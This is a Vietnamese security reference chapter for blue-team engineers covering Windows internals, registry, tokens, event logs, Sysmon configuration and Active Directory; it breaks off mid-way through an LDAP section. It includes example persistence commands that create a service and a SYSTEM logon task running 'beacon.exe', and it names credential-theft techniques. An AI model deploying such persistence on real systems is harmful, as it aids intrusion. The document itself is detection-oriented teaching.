# Chương 3 — Windows & Active Directory

> Tài liệu tham chiếu kỹ thuật dành cho kỹ sư bảo mật (Blue Team / AppSec / DevSecOps). Mỗi mục đi từ **LÀ GÌ → CƠ CHẾ BÊN TRONG (tới mức bit/byte/bước/tham số) → VÍ DỤ THỰC TẾ → LƯU Ý BẢO MẬT**. Các con số được lấy từ tài liệu Microsoft Docs, MS-* Open Specifications, RFC 4120/4178, và mã nguồn Sysinternals/Sysmon công khai; những chỗ cần kiểm chứng được ghi chú rõ.

---

## 3.1. Kiến trúc Windows: Kernel Mode và User Mode

### 3.1.1. Là gì

Windows NT (nền tảng của mọi Windows hiện đại từ XP/2000 trở đi) chia không gian thực thi thành hai vòng (ring) đặc quyền của CPU x86/x64:

- **User mode (Ring 3)**: nơi chạy tiến trình ứng dụng. Mỗi tiến trình có một **không gian địa chỉ ảo (virtual address space)** riêng, cô lập với tiến trình khác. Crash của một process không hạ cả hệ thống.
- **Kernel mode (Ring 0)**: nơi chạy nhân hệ điều hành, driver thiết bị, và HAL. Toàn quyền truy cập phần cứng và toàn bộ RAM. Một lỗi ở đây (driver lỗi, dereference con trỏ NULL) gây **BSOD (Bug Check)**.

Việc tách 2 ring là cơ chế phần cứng: trường `CPL` (Current Privilege Level, 2 bit) trong thanh ghi `CS` quyết định ring hiện tại. Lệnh đặc quyền (như `HLT`, ghi vào CR3) chỉ chạy được khi CPL=0.

### 3.1.2. Cơ chế bên trong: bố cục không gian địa chỉ và chuyển ngữ cảnh

Trên Windows x64, không gian địa chỉ ảo 64-bit thực tế dùng 48 bit (canonical address), chia:

| Vùng | Khoảng địa chỉ (x64) | Ý nghĩa |
|------|----------------------|---------|
| User space | `0x00000000'00000000` – `0x00007FFF'FFFFFFFF` | Code/heap/stack của process (≈128 TB) |
| Vùng cấm (non-canonical) | `0x00008000'00000000` – `0xFFFF7FFF'FFFFFFFF` | Không hợp lệ, dùng để bắt lỗi |
| Kernel space | `0xFFFF8000'00000000` – `0xFFFFFFFF'FFFFFFFF` | Nhân, driver, dùng chung mọi process (≈128 TB) |

**Chuyển từ user → kernel** xảy ra qua **system call**. Trên x64, hàm user-mode (ví dụ `NtCreateFile` trong `ntdll.dll`) nạp **system service number (SSN)** vào thanh ghi `EAX` rồi thực thi lệnh `syscall`:

```asm
; ntdll!NtCreateFile (rút gọn) — số SSN thay đổi theo từng build Windows
mov  r10, rcx          ; syscall quy ước dùng r10 thay cho rcx
mov  eax, 0x55         ; SSN của NtCreateFile (VÍ DỤ — phải kiểm chứng theo build)
syscall                ; chuyển CPL 3 -> 0, nhảy vào KiSystemCall64
ret
```

CPU đọc MSR `IA32_LSTAR` để biết entry point kernel (`nt!KiSystemCall64`), lưu RIP/RFLAGS, đặt CPL=0. Kernel dùng SSN làm index vào **SSDT (System Service Descriptor Table)** `KeServiceDescriptorTable` để gọi đúng hàm `Nt*`.

> Lý do thiết kế: tách ring + chuyển ngữ cảnh có kiểm soát ngăn code user-mode tùy tiện đọc/ghi RAM kernel hay phần cứng — nền tảng của mọi cô lập bảo mật.

### 3.1.3. Các thành phần kernel chính

| Thành phần | File | Vai trò |
|-----------|------|---------|
| Executive | `ntoskrnl.exe` | Quản lý đối tượng, bộ nhớ ảo (Mm), I/O Manager, Process/Thread |
| Kernel (microkernel) | `ntoskrnl.exe` | Lập lịch luồng, đồng bộ, ngắt (DPC/APC) |
| HAL | `hal.dll` | Trừu tượng hóa phần cứng (timer, ngắt, bus) |
| Win32k | `win32k.sys` | GDI/USER (đồ họa, cửa sổ) — bề mặt tấn công lớn |
| Security Reference Monitor (SRM) | trong `ntoskrnl.exe` | Kiểm tra quyền (access check), sinh audit log |

### 3.1.4. Lưu ý bảo mật

- **PatchGuard (Kernel Patch Protection)** trên x64 chống sửa SSDT/cấu trúc kernel — nhưng cũng buộc rootkit chuyển sang kỹ thuật khác (BYOVD — Bring Your Own Vulnerable Driver).
- Driver chạy Ring 0 → một driver ký hợp lệ nhưng có lỗ hổng (ví dụ cho phép đọc/ghi physical memory tùy ý) là vector leo thang quyền phổ biến. Blue Team theo dõi nạp driver qua Sysmon Event ID 6.

---

## 3.2. Registry và Hive

### 3.2.1. Là gì

Registry là CSDL phân cấp lưu cấu hình HĐH và ứng dụng. Cấu trúc logic gồm **key** (như thư mục), **subkey**, và **value** (cặp tên–kiểu–dữ liệu).

Các **root key** (hive logic):

| Root key | Viết tắt | Nguồn dữ liệu vật lý |
|----------|----------|----------------------|
| `HKEY_LOCAL_MACHINE` | HKLM | Các hive file trong `C:\Windows\System32\config\` (SYSTEM, SOFTWARE, SAM, SECURITY) |
| `HKEY_CURRENT_USER` | HKCU | `NTUSER.DAT` trong profile user đang đăng nhập |
| `HKEY_USERS` | HKU | NTUSER.DAT của mọi user đã nạp + `.DEFAULT` |
| `HKEY_CLASSES_ROOT` | HKCR | View hợp nhất của HKLM\Software\Classes + HKCU\Software\Classes |
| `HKEY_CURRENT_CONFIG` | HKCC | Liên kết tới HKLM\SYSTEM\CurrentControlSet\Hardware Profiles\Current |

### 3.2.2. Cơ chế bên trong: định dạng hive file (regf)

Hive file dùng định dạng nhị phân với chữ ký `regf`. Cấu trúc gồm **base block (header)** dài 4096 byte (0x1000), theo sau là các **hive bin (hbin)** chứa các **cell**.

Bố cục **base block** (regf header) — các trường quan trọng:

| Offset | Kích thước | Trường | Ý nghĩa | Ví dụ |
|--------|-----------|--------|---------|-------|
| 0x000 | 4 byte | Signature | Luôn là ASCII `regf` (0x66676572 little-endian) | `72 65 67 66` |
| 0x004 | 4 byte | Primary sequence number | Tăng khi bắt đầu ghi | `0x00000123` |
| 0x008 | 4 byte | Secondary sequence number | Tăng khi ghi xong; nếu ≠ primary → hive dirty | `0x00000123` |
| 0x00C | 8 byte | Last written timestamp | FILETIME (100ns từ 1601) | `0x01D9...` |
| 0x014 | 4 byte | Major version | Thường 1 | `0x00000001` |
| 0x018 | 4 byte | Minor version | Thường 3, 5, hoặc 6 | `0x00000005` |
| 0x020 | 4 byte | Root cell offset | Offset (từ đầu hbin đầu tiên) tới root key node | `0x00000020` |
| 0x028 | 4 byte | Length | Tổng kích thước dữ liệu hive | `0x00100000` |
| 0x1FC | 4 byte | Checksum | XOR của 508 byte đầu (mỗi 4-byte) | `0xABCD1234` |

Mỗi **hbin** dài bội số 4096 byte, header chữ ký `hbin`. Bên trong là **cell**: 4 byte đầu là kích thước (signed int32; âm = đang dùng, dương = free). Các loại cell node:

- `nk` (Key Node): một registry key. Chứa tên, timestamp, offset tới subkey-list, value-list, security (`sk`).
- `vk` (Value Key): một value (tên, kiểu REG_*, offset/inline dữ liệu).
- `sk` (Security Key): chứa **SECURITY_DESCRIPTOR** (DACL/SACL/owner) cho key.
- `lf`/`lh`/`li`/`ri`: các dạng danh sách subkey (lh dùng hash để tra nhanh).

```
+--------- HIVE FILE (regf) ----------+
| Base block (4096 byte)              |  <- chữ ký "regf"
+-------------------------------------+
| hbin #0 (4096 byte)                 |  <- chữ ký "hbin"
|   [cell: nk - ROOT KEY]             |
|   [cell: sk - security descriptor]  |
|   [cell: lh - subkey list]          |
| hbin #1 ...                         |
|   [cell: vk - value "Start"=2]      |
+-------------------------------------+
```

### 3.2.3. Ví dụ thực tế

Đọc giá trị khởi động dịch vụ và xuất hive offline để phân tích forensic:

```cmd
:: Xem cấu hình autostart của một service (Start=2 nghĩa là Automatic)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache" /v Start
::  Start    REG_DWORD    0x2

:: Liệt kê các chương trình tự chạy khi logon (persistence phổ biến)
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

:: Xuất hive SYSTEM offline để phân tích bằng công cụ forensic
reg save HKLM\SYSTEM C:\ir\SYSTEM.hiv
```

Phân tích offline bằng `RegRipper`/`reglookup` (Linux) hoặc PowerShell:

```powershell
# Liệt kê toàn bộ value Run với kiểu và dữ liệu
Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' |
  Format-List
```

Giá trị `Start` trong Services hive (REG_DWORD):

| Giá trị | Tên | Ý nghĩa |
|---------|-----|---------|
| 0 | Boot | Nạp bởi kernel loader (driver khởi động sớm) |
| 1 | System | Nạp khi khởi tạo I/O |
| 2 | Automatic | Tự chạy lúc boot bởi SCM |
| 3 | Manual | Chạy khi có yêu cầu |
| 4 | Disabled | Bị tắt |

### 3.2.4. Lưu ý bảo mật

- Các khóa **autostart extensibility points (ASEP)** là nơi malware giành persistence: `...\CurrentVersion\Run`, `RunOnce`, `Image File Execution Options` (Debugger hijack), `Winlogon\Shell`, `Services`. Sysmon Event ID 12/13/14 ghi lại thay đổi registry.
- Hive `SAM`/`SECURITY` chứa hash mật khẩu cục bộ + LSA secrets — bị bảo vệ bởi SYSTEM ACL nhưng có thể dump offline (sao chép Volume Shadow Copy) → kỹ thuật `secretsdump`.

---

## 3.3. Process, Thread và Access Token

### 3.3.1. Process và Thread — cấu trúc

Một **process** là container (không gian địa chỉ + handle table + token), **thread** mới là đơn vị được lập lịch. Cấu trúc kernel:

- `EPROCESS`: block điều khiển process trong kernel (con trỏ tới page directory `DirectoryTableBase`/CR3, danh sách thread, `Token`, PID, PPID `InheritedFromUniqueProcessId`...).
- `ETHREAD`/`KTHREAD`: control block thread.
- `PEB` (Process Environment Block, user-mode): chứa `ImageBaseAddress`, danh sách module nạp (`Ldr`), command line, biến môi trường.

> Trường `InheritedFromUniqueProcessId` trong EPROCESS chính là PPID mà Sysmon ghi vào Event ID 1 — quan trọng để phát hiện parent-child bất thường (ví dụ `winword.exe` sinh `cmd.exe`).

### 3.3.2. Access Token — cơ chế cấp quyền

Khi user đăng nhập, **LSASS** sinh một **access token** đại diện security context. Mọi thread mặc định dùng token của process; có thể **impersonate** token khác.

Cấu trúc logic của token (truy cập qua `GetTokenInformation`):

| Thành phần | Ý nghĩa |
|-----------|---------|
| User SID | Danh tính chính của chủ token |
| Group SIDs | Danh sách nhóm + thuộc tính (Enabled, UseForDenyOnly...) |
| Privileges | Danh sách `LUID` + attributes (ví dụ `SeDebugPrivilege`, `SeBackupPrivilege`) |
| Owner SID, Primary Group | Mặc định gán cho object mới tạo |
| Default DACL | DACL mặc định cho object do token tạo |
| Token Type | Primary (gắn process) hoặc Impersonation |
| Impersonation Level | Anonymous / Identification / Impersonation / Delegation |
| Integrity Level | Mandatory Integrity Control: Low/Medium/High/System |
| Logon SID, Session ID | Phiên đăng nhập |

### 3.3.3. SID — Security Identifier (cấu trúc nhị phân)

SID nhận diện duy nhất một principal (user, group, máy, domain). Dạng chuỗi: `S-1-5-21-<domain>-<RID>`.

Cấu trúc nhị phân:

| Offset | Kích thước | Trường | Ý nghĩa | Ví dụ |
|--------|-----------|--------|---------|-------|
| 0x00 | 1 byte | Revision | Luôn = 1 | `0x01` |
| 0x01 | 1 byte | SubAuthorityCount | Số sub-authority (tối đa 15) | `0x05` |
| 0x02 | 6 byte | IdentifierAuthority | Big-endian, ví dụ 5 = NT Authority | `00 00 00 00 00 05` |
| 0x08 | 4×N byte | SubAuthority[] | Mỗi cái 32-bit little-endian | `21 ...` rồi RID |

Chuỗi `S-1-5-21-...` giải mã: `S`=SID, `1`=revision, `5`=IdentifierAuthority (NT), tiếp theo là các sub-authority. **RID** là sub-authority cuối.

RID quan trọng cố định (well-known):

| RID / SID | Tên | Ý nghĩa |
|-----------|-----|---------|
| 500 | Administrator | Tài khoản quản trị tích hợp |
| 501 | Guest | Khách |
| 512 | Domain Admins | Nhóm admin domain |
| 513 | Domain Users | |
| 519 | Enterprise Admins | Admin toàn forest |
| `S-1-5-18` | LocalSystem | Tài khoản SYSTEM |
| `S-1-5-32-544` | Builtin\Administrators | |
| `S-1-1-0` | Everyone | |

### 3.3.4. Ví dụ thực tế

```powershell
# Xem token của tiến trình hiện tại: SID, group, privilege
whoami /all

# whoami /priv -> liệt kê privilege và trạng thái Enabled/Disabled
#   SeDebugPrivilege   Debug programs   Disabled
```

```cmd
:: Chuyển SID <-> tên (dùng để điều tra audit log)
:: PsGetSid của Sysinternals
PsGetSid.exe \\dc01 username
:: hoặc dùng PowerShell:
```

```powershell
$sid = (New-Object System.Security.Principal.NTAccount("CORP","jdoe")).Translate([System.Security.Principal.SecurityIdentifier])
$sid.Value      # S-1-5-21-...-1107
```

### 3.3.5. Lưu ý bảo mật

- `SeDebugPrivilege` cho phép mở handle PROCESS_ALL_ACCESS tới mọi process kể cả LSASS → đọc bộ nhớ dump hash. Theo dõi việc bật privilege này.
- **Token impersonation/theft**: malware có `SeImpersonatePrivilege` (mặc định có ở service account) lợi dụng để impersonate SYSTEM (họ tấn công "Potato": JuicyPotato/RoguePotato/PrintSpoofer).
- **Integrity Level** thấp (Low) là sandbox của trình duyệt; UAC dùng IL để tách token Medium (user thường) và High (admin elevated).

---

## 3.4. Services và Scheduled Tasks

### 3.4.1. Services

**Service Control Manager (SCM)** = `services.exe`, quản lý vòng đời dịch vụ. Cấu hình lưu ở `HKLM\SYSTEM\CurrentControlSet\Services\<Name>`:

| Value | Kiểu | Ý nghĩa |
|-------|------|---------|
| `ImagePath` | REG_EXPAND_SZ | Đường dẫn binary (hoặc `svchost.exe -k <group>` cho service trong DLL) |
| `Start` | REG_DWORD | 0–4 (xem bảng 3.2.3) |
| `Type` | REG_DWORD | 0x10=own process, 0x20=share process, 0x1=kernel driver |
| `ObjectName` | REG_SZ | Tài khoản chạy (`LocalSystem`, `NT AUTHORITY\NetworkService`...) |
| `ServiceDll` | REG_SZ (subkey Parameters) | DLL với service dạng svchost |

```cmd
:: Tạo service mới (kỹ thuật persistence/lateral movement phổ biến)
sc create EvilSvc binPath= "C:\temp\beacon.exe" start= auto
sc qc Dnscache           :: query config
sc query Dnscache        :: trạng thái runtime
```

> Lý do `svchost.exe -k netsvcs`: gom nhiều service nhẹ vào một process để tiết kiệm tài nguyên. Tác dụng phụ bảo mật: nhiều service chạy chung token → bề mặt lớn, khó phân biệt service nào lỗi.

**Lưu ý bảo mật**: Event ID **7045** (System log) = "A new service was installed" — tín hiệu mạnh cho lateral movement (PsExec tạo service `PSEXESVC`). **Unquoted service path** + ghi được vào thư mục cha = leo thang quyền cổ điển.

### 3.4.2. Scheduled Tasks

Lưu tại `C:\Windows\System32\Tasks\<TaskName>` (XML) + đăng ký trong registry `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache`.

Ví dụ XML task chạy khi logon:

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>          <!-- chạy với quyền SYSTEM -->
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Actions>
    <Exec><Command>C:\temp\beacon.exe</Command></Exec>
  </Actions>
</Task>
```

```cmd
:: Tạo task chạy mỗi khi user logon
schtasks /create /tn "Updater" /tr "C:\temp\beacon.exe" /sc onlogon /ru SYSTEM
```

**Lưu ý bảo mật**: Event ID **4698** (task created), **4702** (updated) trong Security log; **106/200/201** trong `Microsoft-Windows-TaskScheduler/Operational`. Chạy `SYSTEM` + trigger logon = persistence cần soi.

---

## 3.5. Windows Event Log — các Event ID bảo mật cốt lõi

### 3.5.1. Cơ chế: định dạng EVTX

Event log hiện đại (Vista+) lưu file `.evtx` (`C:\Windows\System32\winevt\Logs\Security.evtx`) dạng nhị phân binary XML. Cấu trúc:

- **File header (`ElfFile\0`, 4096 byte)**: chữ ký `45 6C 66 46 69 6C 65 00`, chứa first/last chunk number, next record ID.
- **Chunk (65536 byte mỗi cái)**: chữ ký `ElfChnk\0`, mỗi chunk chứa nhiều **event record**.
- **Event record**: chữ ký `0x2A2A` (`**`), kích thước, **EventRecordID** (64-bit), timestamp FILETIME, rồi payload **Binary XML** (BinXML — token-based để nén tên phần tử/thuộc tính lặp lại).

```
ElfFile\0 header (4096B)
└── Chunk 0 (64KB)  [ElfChnk\0]
     ├── Record (** | size | RecordID | FileTime | BinXML)
     ├── Record ...
└── Chunk 1 (64KB) ...
```

Mỗi event được render thành XML với `<System>` (Provider, EventID, TimeCreated, Computer, Security UserID) và `<EventData>` (các `<Data Name="...">`).

### 3.5.2. Event 4624 — Đăng nhập thành công

Đây là event quan trọng nhất. Các trường `<EventData>` chính:

| Trường | Ý nghĩa | Ví dụ |
|--------|---------|-------|
| `SubjectUserSid` | SID chủ thể yêu cầu logon (thường SYSTEM) | S-1-5-18 |
| `TargetUserName` | Tài khoản đăng nhập | jdoe |
| `TargetDomainName` | Domain | CORP |
| `TargetUserSid` | SID người đăng nhập | S-1-5-21-...-1107 |
| `LogonType` | Kiểu đăng nhập (xem bảng) | 3 |
| `LogonProcessName` | Tiến trình xác thực | Kerberos / NtLmSsp / User32 |
| `AuthenticationPackageName` | Gói auth | Kerberos / NTLM / Negotiate |
| `WorkstationName` | Máy nguồn (NTLM) | WS01 |
| `IpAddress` | IP nguồn | 10.0.0.5 |
| `LogonGuid` | GUID liên kết với 4769 (Kerberos) | {…} |
| `ElevatedToken` | %%1842 (Yes) nếu token elevated | |

**Logon Type** — cốt lõi để hiểu cách truy cập:

| Type | Tên | Ý nghĩa |
|------|-----|---------|
| 2 | Interactive | Đăng nhập tại bàn phím (hoặc RDP qua console) |
| 3 | Network | Truy cập tài nguyên qua mạng (SMB, IIS) — **không** lưu credential trên máy đích |
| 4 | Batch | Scheduled task |
| 5 | Service | SCM khởi động service |
| 7 | Unlock | Mở khóa màn hình |
| 8 | NetworkCleartext | Mật khẩu gửi cleartext (IIS Basic Auth) |
| 9 | NewCredentials | `runas /netonly` — credential mới cho kết nối mạng (dấu hiệu pass-the-hash với Mimikatz!) |
| 10 | RemoteInteractive | RDP / Terminal Services |
| 11 | CachedInteractive | Đăng nhập bằng cached credential (offline) |

> **Logon Type 9** rất đáng ngờ: Mimikatz `sekurlsa::pth` tạo logon session type 9 + LogonProcessName `seclogo`. Săn: 4624 type 9 + process là `mimikatz`/`rundll32` bất thường.

### 3.5.3. Event 4625 — Đăng nhập thất bại

Thêm trường `Status`/`SubStatus` (mã NTSTATUS) cho biết lý do:

| SubStatus | Ý nghĩa |
|-----------|---------|
| `0xC0000064` | User không tồn tại |
| `0xC000006A` | Sai mật khẩu |
| `0xC0000234` | Tài khoản bị khóa (locked out) |
| `0xC0000072` | Tài khoản bị disable |
| `0xC0000193` | Tài khoản hết hạn |
| `0xC000006F` | Đăng nhập ngoài giờ cho phép |

> Săn brute-force/password spraying: nhiều 4625 `0xC000006A` từ một IP tới nhiều TargetUserName (spraying) hoặc một user nhiều lần (brute force).

### 3.5.4. Các Event ID Security khác

| Event ID | Ý nghĩa | Trường/ghi chú quan trọng |
|----------|---------|---------------------------|
| **4634** | Logoff | `LogonType`, `TargetLogonId` (khớp với 4624) |
| **4647** | User-initiated logoff | |
| **4672** | Special privileges assigned to new logon | Sinh kèm mỗi logon admin; `PrivilegeList` chứa SeDebug/SeBackup... → dùng dò admin logon |
| **4688** | A new process has been created | `NewProcessName`, `ProcessId`, `CommandLine` (cần bật audit "Include command line"), `ParentProcessName`, `TokenElevationType` |
| **4720** | A user account was created | `TargetUserName`, `SubjectUserName` (ai tạo) |
| **4722/4725/4726** | Account enabled / disabled / deleted | |
| **4728/4732/4756** | Member added to global/local/universal group | Theo dõi thêm vào Domain Admins |
| **4768** | Kerberos TGT requested (AS-REQ) | `TicketEncryptionType`, `PreAuthType`, IP client |
| **4769** | Kerberos service ticket requested (TGS-REQ) | `ServiceName`, `TicketEncryptionType` (0x17=RC4 → Kerberoasting!) |
| **4771** | Kerberos pre-authentication failed | `FailureCode` (0x18 = sai mật khẩu) |
| **4776** | NTLM credential validation (DC) | `Status` |
| **1102** | The audit log was cleared | Trường `SubjectUserName`/`SubjectUserSid` — ai xóa log |
| **4719** | System audit policy was changed | Kẻ tấn công tắt audit |

### 3.5.5. Event 4688 — chi tiết command line

Mặc định 4688 **không** chứa command line. Phải bật:

```cmd
:: Bật ghi command line trong 4688 (GPO: Administrative Templates >
::   System > Audit Process Creation)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" ^
  /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f

:: Bật audit subcategory "Process Creation"
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
```

Sau khi bật, một event 4688 mẫu (rút gọn):

```xml
<EventData>
  <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
  <Data Name="ProcessId">0x1a2c</Data>
  <Data Name="CommandLine">cmd.exe /c whoami /all</Data>
  <Data Name="ParentProcessName">C:\Program Files\Microsoft Office\WINWORD.EXE</Data>
  <Data Name="TokenElevationType">%%1936</Data>   <!-- Type 1 = full token -->
  <Data Name="SubjectUserName">jdoe</Data>
</EventData>
```

`TokenElevationType`: `%%1936` (Type 1, full token, không UAC split), `%%1937` (Type 2, elevated qua UAC), `%%1938` (Type 3, limited).

### 3.5.6. Event 1102 — Audit log cleared

```xml
<UserData>
  <LogFileCleared>
    <SubjectUserSid>S-1-5-21-...-1107</SubjectUserSid>
    <SubjectUserName>attacker</SubjectUserName>
    <SubjectDomainName>CORP</SubjectDomainName>
  </LogFileCleared>
</UserData>
```

> **Lưu ý bảo mật**: 1102 (Security) và 104 (System, log khác bị clear) là chỉ báo anti-forensic. Forward log realtime (WEF/Sysmon→SIEM) trước khi attacker clear là biện pháp đối phó.

---

## 3.6. Sysmon — System Monitor

### 3.6.1. Là gì

Sysmon (Sysinternals) là driver + service ghi log telemetry chi tiết vào `Microsoft-Windows-Sysmon/Operational`. Vượt xa audit native vì có **hash file, GUID process, ánh xạ network→process, command line đầy đủ, ProcessGUID nối các event**.

### 3.6.2. Các Event ID Sysmon trọng yếu

| Event ID | Sự kiện | Trường nổi bật |
|----------|---------|----------------|
| **1** | Process creation | `Image`, `CommandLine`, `Hashes`, `ParentImage`, `ParentCommandLine`, `ProcessGuid`, `User`, `IntegrityLevel`, `OriginalFileName` |
| **3** | Network connection | `Image`, `Protocol`, `SourceIp/Port`, `DestinationIp/Port`, `DestinationHostname` |
| **5** | Process terminated | `ProcessGuid`, `Image` |
| **7** | Image (DLL) loaded | `ImageLoaded`, `Signed`, `Signature`, `SignatureStatus`, `Hashes` — phát hiện DLL hijacking/unsigned DLL |
| **8** | CreateRemoteThread | `SourceImage`, `TargetImage`, `StartAddress` — phát hiện process injection |
| **10** | ProcessAccess | `SourceImage`, `TargetImage`, `GrantedAccess` — phát hiện đọc LSASS (0x1010/0x1410) |
| **11** | File created | `TargetFilename`, `CreationUtcTime` — drop payload |
| **12/13/14** | Registry key/value/rename | `TargetObject`, `Details` — persistence ASEP |
| **22** | DNS query | `QueryName`, `QueryResults`, `Image` — phát hiện C2/DGA |

### 3.6.3. Cấu hình XML thực tế

Sysmon dùng file config XML với schema versioning. Ví dụ config tối giản nhưng hiệu quả:

```xml
<Sysmon schemaversion="4.90">
  <HashAlgorithms>SHA256,IMPHASH</HashAlgorithms>
  <EventFiltering>

    <!-- EID 1: ghi mọi process, nhưng loại bớt nhiễu -->
    <RuleGroup name="ProcCreate" groupRelation="or">
      <ProcessCreate onmatch="exclude">
        <Image condition="is">C:\Windows\System32\SearchIndexer.exe</Image>
      </ProcessCreate>
    </RuleGroup>

    <!-- EID 10: cảnh báo truy cập LSASS -->
    <RuleGroup name="LsassAccess" groupRelation="or">
      <ProcessAccess onmatch="include">
        <TargetImage condition="image">lsass.exe</TargetImage>
      </ProcessAccess>
    </RuleGroup>

    <!-- EID 22: log mọi DNS query trừ domain Microsoft tin cậy -->
    <RuleGroup name="Dns" groupRelation="or">
      <DnsQuery onmatch="exclude">
        <QueryName condition="end with">.microsoft.com</QueryName>
      </DnsQuery>
    </RuleGroup>

    <!-- EID 13: persistence registry -->
    <RuleGroup name="RegPersist" groupRelation="or">
      <RegistryEvent onmatch="include">
        <TargetObject condition="contains">\CurrentVersion\Run</TargetObject>
      </RegistryEvent>
    </RuleGroup>

  </EventFiltering>
</Sysmon>
```

Giải thích tham số:
- `onmatch="include"`: chỉ ghi event KHỚP rule (whitelist). `onmatch="exclude"`: ghi MỌI event TRỪ cái khớp (blacklist).
- `groupRelation="or"`: chỉ cần 1 rule trong group khớp.
- `condition`: `is`, `contains`, `begin with`, `end with`, `image` (so khớp tên file bỏ qua path), `regex`...

```cmd
:: Cài đặt Sysmon với config
Sysmon64.exe -accepteula -i sysmonconfig.xml

:: Cập nhật config mà không cài lại
Sysmon64.exe -c sysmonconfig.xml
```

Một Event ID 1 mẫu (rút gọn):

```xml
<EventData>
  <Data Name="UtcTime">2026-06-19 03:21:55.123</Data>
  <Data Name="ProcessGuid">{a1b2...}</Data>
  <Data Name="ProcessId">6948</Data>
  <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
  <Data Name="CommandLine">cmd /c "powershell -enc SQBFAFgA..."</Data>
  <Data Name="Hashes">SHA256=...,IMPHASH=...</Data>
  <Data Name="ParentImage">C:\Program Files\...\WINWORD.EXE</Data>
  <Data Name="ParentCommandLine">"WINWORD.EXE" /n invoice.docx</Data>
  <Data Name="User">CORP\jdoe</Data>
  <Data Name="IntegrityLevel">Medium</Data>
</EventData>
```

> **Lưu ý bảo mật**: ProcessGuid bền vững (không bị tái dùng như PID) → nối toàn bộ chuỗi event của một process. Event 8/10 với GrantedAccess `0x1410`/`0x1010` tới `lsass.exe` là chỉ báo credential dumping mạnh.

---

## 3.7. Active Directory — Cấu trúc luận lý và vật lý

### 3.7.1. Domain, Tree, Forest, OU

| Khái niệm | Định nghĩa |
|-----------|-----------|
| **Domain** | Ranh giới quản trị + bản sao CSDL (NTDS.dit). DC đồng bộ cùng namespace, ví dụ `corp.example.com` |
| **Tree** | Tập domain chia sẻ namespace liên tục (`corp.example.com` ↔ `sales.corp.example.com`) |
| **Forest** | Ranh giới bảo mật cao nhất. Chia sẻ schema chung + Global Catalog + Enterprise Admins. **Forest là ranh giới tin cậy thật sự** |
| **OU (Organizational Unit)** | Container để áp GPO và ủy quyền quản trị (delegation) |
| **Site** | Cấu trúc vật lý theo subnet IP — điều khiển replication và chọn DC gần nhất |

### 3.7.2. NTDS.dit và phân vùng

CSDL AD nằm trong `C:\Windows\NTDS\ntds.dit` (định dạng ESE/JET Blue). Chia thành các **naming context (partition)**:

| Partition | DN | Nội dung | Phạm vi replicate |
|-----------|-----|----------|-------------------|
| Schema | `CN=Schema,CN=Configuration,DC=...` | Định nghĩa class/attribute | Toàn forest |
| Configuration | `CN=Configuration,DC=...` | Site, subnet, service | Toàn forest |
| Domain | `DC=corp,DC=example,DC=com` | User, group, computer | Một domain |
| Application (DNS) | `DC=DomainDnsZones,...` | DNS tích hợp AD | Tùy cấu hình |

### 3.7.3. Schema

Schema định nghĩa **classSchema** (lớp object) và **attributeSchema** (thuộc tính). Mỗi attribute có:
- `attributeID`: OID (ví dụ `1.2.840.113556.1.4.221` cho sAMAccountName).
- `attributeSyntax` + `oMSyntax`: kiểu dữ liệu.
- `isSingleValued`, `searchFlags` (bit 1 = indexed).

> Lý do schema replicate toàn forest và khó sửa: một thay đổi schema là vĩnh viễn (chỉ deactivate, không xóa hẳn) và ảnh hưởng mọi DC — nên forest là ranh giới schema.

### 3.7.4. GPO — Group Policy Object

GPO gồm 2 phần:
- **GPC (Group Policy Container)**: object trong AD (`CN=Policies,CN=System,DC=...`), chứa version + GUID + danh sách CSE.
- **GPT (Group Policy Template)**: file trên SYSVOL `\\domain\SYSVOL\<domain>\Policies\{GUID}\` chứa `gpt.ini`, `Registry.pol`, scripts.

Thứ tự áp dụng **LSDOU**: Local → Site → Domain → OU (OU sau ghi đè trước, trừ khi "Enforced"/"Block Inheritance").

```powershell
# Xem GPO áp lên user/máy hiện tại
gpresult /h C:\report.html /f

# Liệt kê GPO trong domain
Get-GPO -All | Select DisplayName, Id, GpoStatus
```

> **Lưu ý bảo mật**: SYSVOL đọc được bởi mọi Authenticated User. Lịch sử: GPP (`Groups.xml`) từng chứa mật khẩu mã hóa AES với **key công khai** (CVE-2014-1812) → ai cũng giải được. Săn file `cpassword` trong SYSVOL.

### 3.7.5. Trust — quan hệ tin cậy

| Loại | Hướng | Bắc cầu (transitive) | Dùng khi |
|------|-------|----------------------|----------|
| Parent-Child | Hai chiều | Có | Trong cùng tree |
| Tree-Root | Hai chiều | Có | Giữa tree trong forest |
| External | Một/hai chiều | Không | Tới domain ngoài forest |
| Forest | Một/hai chiều | Có (trong forest đối tác) | Giữa 2 forest |
| Realm | | | Tới Kerberos realm phi-Windows |

Trust dùng **trust key** (inter-realm key) để DC bên này phát hành **referral TGT** cho bên kia. Tấn công liên quan: **SID History** + cross-domain golden ticket để leo quyền qua trust nếu không bật SID filtering.

---

## 3.8. LDAP — giao thức truy vấn AD

### 3.8.1. Là gì và cơ chế

AD expose CSDL qua **LDAP** (RFC 4511) trên TCP **389** (cleartext/StartTLS), **636** (LDAPS), **3268/3269** (Global Catalog). LDAP dùng mã hóa **BER/ASN.1** cho message.

Cấu trúc một **LDAPMessage** (ASN.1):

```
LDAPMessage ::= SEQUENCE {
    messageID       INTEGER (0..maxInt),
    protocolOp      CHOICE { bindRequest, searchRequest, searchResEntry, ... },
    controls        [0] Controls OPTIONAL
}
```

Một **searchRequest** chứa: `baseObject` (DN gốc), `scope` (baseObject=0 / singleLevel=1 / wholeSubtree=2), `derefAliases`, `sizeLimit`, `timeLimit`, `filter`, `attributes`.

Bộ lọc (search filter) dạng RFC 4515:

```
(&(objectClass=user)(sAMAccountName=jdoe))
